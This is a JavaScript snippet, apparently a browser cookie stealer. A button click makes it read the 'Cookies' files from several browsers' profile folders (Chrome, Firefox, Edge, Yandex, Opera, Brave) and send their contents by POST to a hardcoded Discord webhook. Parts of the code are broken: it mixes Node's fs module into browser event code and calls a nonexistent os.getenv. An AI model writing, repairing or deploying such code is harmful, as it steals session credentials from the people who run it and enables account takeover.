document.getElementById('extract-btn').addEventListener('click', function() {
    // Webhook URL
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1388760353772535930/pnZFz1Prz8k7n0K861P_87Jlc__lNawsrYe1YpFCXItj-pwbOLcHU9ggPAgNKxe4Zzle';

    // Common paths to sensitive data
    const COMMON_PATHS = [
        'C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default',
        'C:\\Users\\%username%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default',
        'C:\\Users\\%username%\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default',
        'C:\\Users\\%username%\\AppData\\Roaming\\Opera Software\\Opera Stable',
        'C:\\Users\\%username%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default'
    ];

    // Function to read files
    function readFile(path) {
        return new Promise((resolve, reject) => {
            const fs = require('fs');
            fs.readFile(path, 'utf8', (err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
    }

    // Function to send data to webhook
    function sendToWebhook(data) {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => console.log('Success:', data))
        .catch((error) => console.error('Error:', error));
    }

    // Main function
    async function main() {
        const username = os.getenv('USERNAME');
        const extractedData = {};

        for (const path of COMMON_PATHS) {
            const formattedPath = path.replace('%username%', username);
            try {
                const data = await readFile(formattedPath + '\\Cookies');
                extractedData[formattedPath] = { cookies: data };
            } catch (err) {
                console.error(`Error reading ${formattedPath}:`, err);
            }
        }

        // Add timestamp
        extractedData.timestamp = new Date().toISOString();

        // Send data to webhook
        sendToWebhook(extractedData);
    }

    main();
});
